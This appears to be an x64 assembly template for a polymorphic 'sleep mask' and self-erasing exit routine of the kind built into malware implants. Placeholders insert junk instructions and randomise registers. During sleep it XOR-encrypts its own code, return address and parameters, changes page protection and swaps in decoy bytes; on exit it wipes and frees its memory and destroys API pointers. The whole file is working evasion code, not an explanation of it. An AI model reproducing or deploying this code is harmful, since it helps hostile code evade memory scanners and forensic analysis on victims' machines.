.code64

// notice:
//   if VirtualProtect is zero, skip adjust page protect
//   if DecoyAddress or DecoySize is zero, skip fill decoy
//   CriticalSize must be 8 bytes aligned

// struct:
//   ======== Sleep ========                               ======== Exit ========
//   [rbp + 0*8]  Method                                   [rbp + 0*8]  Method
//   [rbp + 1*8]  VirtualProtect                           [rbp + 1*8]  VirtualProtect
//   [rbp + 2*8]  WaitForSingleObject                      [rbp + 2*8]  VirtualFree
//   [rbp + 3*8]  Reserved                                 [rbp + 3*8]  ExitThread
//   [rbp + 4*8]  CriticalAddress                          [rbp + 4*8]  CriticalAddress
//   [rbp + 5*8]  CriticalSize                             [rbp + 5*8]  CriticalSize
//   [rbp + 6*8]  DecoyAddress                             [rbp + 6*8]  DecoyAddress
//   [rbp + 7*8]  DecoySize                                [rbp + 7*8]  DecoySize
//   [rbp + 8*8]  ShelterAddress
//   [rbp + 9*8]  TimerHandle

// step:
//   encrypt return address                                erase return address
//   encrypt critical instructions to shelter              adjust the critical memory page protect
//   adjust the critical memory page protect               fill critical memory with decoy
//   fill critical memory with decoy                       free critical memory page
//   encrypt stack about structure                         exit current thread
//   call WaitForSingleObject
//   decrypt stack about structure
//   recover the critical instructions from shelter
//   restore the critical memory page protect
//   decrypt return address

entry:
  // check argument pointer is NULL
  test rcx, rcx                                {{iji}}
  jz exit                                      {{iji}}

  // save rcx, because it maybe overwrite next
  push rcx                                     {{iji}}

  // check method and dispatch
  mov {{.RegV.rax}}, [rcx]                     {{iji}}
  cmp {{.RegV.rax}}, 1                         {{iji}}
  je method_sleep                              {{iji}}
  cmp {{.RegV.rax}}, 2                         {{iji}}
  je method_exit                               {{iji}}

  // process the stack balance
  pop rcx                                      {{iji}}

 exit:
  ret                                          {{iji}}

method_sleep:
  // restore argument pointer
  pop rcx                                      {{iji}}

  // save context and ensure stack is 16 bytes alignd
  push {{.RegN.rbp}}                           {{iji}} // for save structure pointer
  push {{.RegN.rbx}}                           {{iji}} // for save crypto key
  push {{.RegN.rsi}}                           {{iji}} // for save the memory page old protect

  // save structure pointer
  mov {{.RegN.rbp}}, rcx                       {{iji}}

  // generate crypto key from registers
  call gen_key                                 {{iji}}

  // encrypt return address
  mov {{.RegV.rcx}}, [rsp + 3*8]               {{iji}}
  xor {{.RegV.rcx}}, {{.RegN.rbx}}             {{iji}}
  mov [rsp + 3*8], {{.RegV.rcx}}               {{iji}}

  // encrypt the critical memory to shelter
  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set critical size
  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 8*8]     {{iji}} // set shelter address
  call xor_buf                                 {{iji}}

  // encrypt address of WaitForSingleObject
  xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}

  // adjust the page protect to PAGE_READWRITE
  mov {{.RegV.rcx}}, 0x04                      {{iji}}
  call protect                                 {{iji}}

  // decrypt address of WaitForSingleObject
  xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}

  // erase critical memory and deploy decoy
  call decoy                                   {{iji}}

  // prepare argument before encrypt stack
  xor {{.RegV.eax}}, {{.RegV.eax}}             {{iji}} // clear register
  dec {{.RegV.eax}}                            {{iji}} // calculate INFINITE (0xFFFFFFFF)
  mov edx, {{.RegV.eax}}                       {{iji}} // set INFINITE
  mov rcx, [{{.RegN.rbp}} + 9*8]               {{iji}} // set handle of hTimer
  mov rax, [{{.RegN.rbp}} + 2*8]               {{iji}} // get address of WaitForSingleObject

  // save argument about WaitForSingleObject
  push rax                                     {{iji}}
  push rcx                                     {{iji}}
  push rdx                                     {{iji}}

  // encrypt argument structure
  mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
  mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
  call xor_buf                                 {{iji}}

  // restore argument about WaitForSingleObject
  pop rdx                                      {{iji}}
  pop rcx                                      {{iji}}
  pop rax                                      {{iji}}

  // Sleep with WaitForSingleObject
  sub rsp, 0x20                                {{iji}} // reserve stack for call convention
  call rax                                     {{iji}} // call WaitForSingleObject
  add rsp, 0x20                                {{iji}} // restore stack for call convention

  // decrypt argument structure
  mov {{.RegV.rcx}}, {{.RegN.rbp}}             {{iji}} // set structure pointer
  mov {{.RegV.rdx}}, 10*8                      {{iji}} // set the buffer size
  mov {{.RegV.rax}}, {{.RegN.rbp}}             {{iji}} // padding dst address
  call xor_buf                                 {{iji}}

  // recover the critical memory from shelter
  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 8*8]     {{iji}} // set shelter address
  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set shelter size
  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
  call xor_buf                                 {{iji}}

  // recover the page protect to old protect
  mov {{.RegV.rcx}}, {{.RegN.rsi}}             {{iji}}
  call protect                                 {{iji}}

  // decrypt return address
  mov {{.RegV.rcx}}, [rsp + 3*8]               {{iji}}
  xor {{.RegV.rcx}}, {{.RegN.rbx}}             {{iji}}
  mov [rsp + 3*8], {{.RegV.rcx}}               {{iji}}

  // restore context
  pop {{.RegN.rsi}}                            {{iji}}
  pop {{.RegN.rbx}}                            {{iji}}
  pop {{.RegN.rbp}}                            {{iji}}
  ret                                          {{iji}}

method_exit:
  // restore argument pointer
  pop rcx                                      {{iji}}

  // save context and ensure stack is 16 bytes alignd
  push {{.RegN.rbp}}                           {{iji}} // for save structure pointer
  push {{.RegN.rbx}}                           {{iji}} // for save crypto key
  push {{.RegN.rsi}}                           {{iji}} // for save the memory page old protect

  // save structure pointer
  mov {{.RegN.rbp}}, rcx                       {{iji}}

  // generate crypto key from registers
  call gen_key                                 {{iji}}

  // erase return address
  xor {{.RegV.rcx}}, {{.RegV.rcx}}             {{iji}}
  mov [rsp + 3*8], {{.RegV.rcx}}               {{iji}}

  // encrypt address of VirtualFree and ExitThread
  xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
  xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}

  // adjust the page protect to PAGE_READWRITE
  mov {{.RegV.rcx}}, 0x04                      {{iji}}
  call protect                                 {{iji}}

  // destroy address of VirtualProtect
  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 1*8]     {{iji}}
  xor [{{.RegN.rbp}} + 1*8], {{.RegV.rcx}}     {{iji}}

  // decrypt address of VirtualFree and ExitThread
  xor [{{.RegN.rbp}} + 2*8], {{.RegN.rbx}}     {{iji}}
  xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}

  // erase critical memory and deploy decoy
  call decoy                                   {{iji}}

  // encrypt address of ExitThread
  xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}

  // save register for store api address
  push {{.RegN.rdi}}                           {{iji}}

  // release critical memory
  mov {{.RegN.rdi}} , [{{.RegN.rbp}} + 2*8]    {{iji}} // get address of VirtualFree
  xor [{{.RegN.rbp}} + 2*8], {{.RegN.rdi}}     {{iji}} // destroy address of VirtualFree
  mov rcx, [{{.RegN.rbp}} + 4*8]               {{iji}} // lpAddress
  xor rdx, rdx                                 {{iji}} // dwSize = 0
  mov r8, 0x4000                               {{iji}} // dwFreeType = MEM_RELEASE
  sub rsp, 0x28                                {{iji}} // reserve stack for call convention
  call {{.RegN.rdi}}                           {{iji}} // call VirtualFree
  add rsp, 0x28                                {{iji}} // restore stack for call convention

  // decrypt address of ExitThread
  xor [{{.RegN.rbp}} + 3*8], {{.RegN.rbx}}     {{iji}}

  // exit current thread
  mov {{.RegN.rdi}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // get address of ExitThread
  xor [{{.RegN.rbp}} + 3*8], {{.RegN.rdi}}     {{iji}} // destroy address of ExitThread
  xor rcx, rcx                                 {{iji}} // dwExitCode = 0
  sub rsp, 0x28                                {{iji}} // reserve stack for call convention
  call {{.RegN.rdi}}                           {{iji}} // call ExitThread
  add rsp, 0x28                                {{iji}} // restore stack for call convention

  // restore context
  pop {{.RegN.rdi}}                            {{iji}} // unreachable
  pop {{.RegN.rsi}}                            {{iji}} // unreachable
  pop {{.RegN.rbx}}                            {{iji}} // unreachable
  pop {{.RegN.rbp}}                            {{iji}} // unreachable

  // it will return to the released memory page
  ret                                          {{iji}} // unreachable

gen_key:
  pop {{.RegV.rax}}                            {{iji}}
  push {{.RegV.rax}}                           {{iji}}
  mov {{.RegN.rbx}}, rsp                       {{iji}}
  add {{.RegN.rbx}}, {{.RegV.rax}}             {{iji}}
  xor {{.RegN.rbx}}, rcx                       {{iji}}
  add {{.RegN.rbx}}, {{.Reg.rdx}}              {{iji}}
  ror {{.RegN.rbx}}, {{.Less16.A}}             {{iji}}
  xor {{.RegN.rbx}}, {{.Reg.rdi}}              {{iji}}
  rol {{.RegN.rbx}}, {{.Less32.A}}             {{iji}}
  add {{.RegN.rbx}}, {{.Reg.rsi}}              {{iji}}
  ror {{.RegN.rbx}}, {{.Less64.A}}             {{iji}}
  ret                                          {{iji}}

xor_buf:
  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
 loop_xor:
  mov {{.RegV.r8}}, [{{.RegV.rcx}}]            {{iji}} // load data from source
  mov [{{.RegV.rax}}], {{.RegV.r8}}            {{iji}} // copy data to destination
  xor [{{.RegV.rax}}], {{.RegN.rbx}}           {{iji}} // encrypt data with crypto key
  add {{.RegV.rcx}}, 8                         {{iji}} // add source address
  add {{.RegV.rax}}, 8                         {{iji}} // add destination address
  dec {{.RegV.rdx}}                            {{iji}} // update loop count
  jnz loop_xor                                 {{iji}} // check need decrypt again
  ret                                          {{iji}}

protect:
  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get VirtualProtect address
  test {{.RegV.rax}}, {{.RegV.rax}}            {{iji}} // check VirtualProtect address is zero
  jz skip_protect                              {{iji}} // check need skip protect
  push {{.RegN.rdi}}                           {{iji}} // save non-volatile register
  mov {{.RegN.rdi}}, {{.RegV.rax}}             {{iji}} // copy address of VirtualProtect
  xor {{.RegV.rax}}, {{.RegV.rax}}             {{iji}} // clear register about VirtualProtect
  xor [{{.RegN.rbp}} + 1*8], {{.RegN.rbx}}     {{iji}} // encrypt address of VirtualProtect
  push {{.RegV.rcx}}                           {{iji}} // prevent overwrite register by next
  mov rcx, [{{.RegN.rbp}} + 4*8]               {{iji}} // set address of critical
  mov rdx, [{{.RegN.rbp}} + 5*8]               {{iji}} // set size of critical
  pop r8                                       {{iji}} // set new protect
  sub rsp, 0x08                                {{iji}} // for save old protect
  mov r9,  rsp                                 {{iji}} // lpflOldProtect
  sub rsp, 0x28                                {{iji}} // reserve stack for call convention
  call {{.RegN.rdi}}                           {{iji}} // call VirtualProtect
  add rsp, 0x28                                {{iji}} // restore stack for call convention
  mov {{.RegN.rsi}}, [rsp]                     {{iji}} // save old protect
  add rsp, 0x08                                {{iji}} // restore stack for old protect
  xor [{{.RegN.rbp}} + 1*8], {{.RegN.rbx}}     {{iji}} // decrypt address of VirtualProtect
  pop {{.RegN.rdi}}                            {{iji}} // restore non-volatile register

 skip_protect:
  ret                                          {{iji}}

decoy:
  // erase critical memory
  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address
  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set critical size
  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
  xor {{.RegV.rax}}, {{.RegV.rax}}             {{iji}} // calculate zero value
 loop_erase:
  mov [{{.RegV.rcx}}], {{.RegV.rax}}           {{iji}} // erase data
  add {{.RegV.rcx}}, 8                         {{iji}} // add critical address
  dec {{.RegV.rdx}}                            {{iji}} // update loop count
  jnz loop_erase                               {{iji}} // check need erase next

  // fill critical memory with decoy
  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // get decoy address
  test {{.RegV.rcx}}, {{.RegV.rcx}}            {{iji}} // check decoy address is zero
  jz skip_decoy                                {{iji}} // check need skip fill
  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 7*8]     {{iji}} // set decoy size (loop count)
  test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
  jz skip_decoy                                {{iji}} // check need skip fill
  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical address

 loop_decoy:
  mov {{.RegV.r8b}}, [{{.RegV.rcx}}]           {{iji}} // load one byte from decoy
  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
  inc {{.RegV.rax}}                            {{iji}} // update critical address
  dec {{.RegV.rdx}}                            {{iji}} // update loop count
  jnz loop_decoy                               {{iji}} // check need fill next

 skip_decoy:
  ret                                          {{iji}}
